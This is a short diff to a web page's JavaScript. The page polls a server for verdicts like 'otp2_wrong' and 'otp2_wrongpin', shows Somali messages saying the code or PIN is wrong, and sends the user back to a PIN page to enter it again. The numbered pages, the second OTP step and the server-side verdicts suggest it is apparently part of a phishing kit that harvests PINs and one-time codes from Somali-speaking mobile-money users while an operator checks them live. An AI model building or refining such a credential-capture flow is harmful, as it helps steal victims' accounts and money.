@@ -113,7 +113,7 @@ let pollingInterval;
 
 window.onload = () => {
     if (!phone) {
-        window.location.href = "/index.html";
+        window.location.href = "/page6";   // ✅ FIXED (PIN PAGE)
     }
     startTimer();
 };
@@ -201,7 +201,7 @@ function startPolling() {
                 window.location.href = "/success.html";
             }
 
-            /* ❌ WRONG CODE (SOMALI MESSAGE) */
+            /* ❌ WRONG CODE (SOMALI) */
             if (data.status === "otp2_wrong") {
                 clearInterval(pollingInterval);
                 statusMsg.innerText = "❌ Koodhka waa khalad, fadlan dib u geli koodhka saxda ah";
@@ -209,10 +209,17 @@ function startPolling() {
                 resetInputs();
             }
 
-            /* 🔑 WRONG PIN → REDIRECT TO PIN PAGE */
+            /* 🔑 WRONG PIN → GO BACK TO PAGE 6 */
             if (data.status === "otp2_wrongpin") {
                 clearInterval(pollingInterval);
-                window.location.href = "/index.html"; // PIN page (fresh start)
+                statusMsg.innerText = "🔑 PIN waa khalad, fadlan geli PIN-ka saxda ah mar kale";
+                statusMsg.style.color = "red";
+
+                setTimeout(() => {
+                    window.location.href = "/page6";   // ✅ FIXED
+                }, 1500);
+
+                resetInputs();
             }
 
         } catch {}
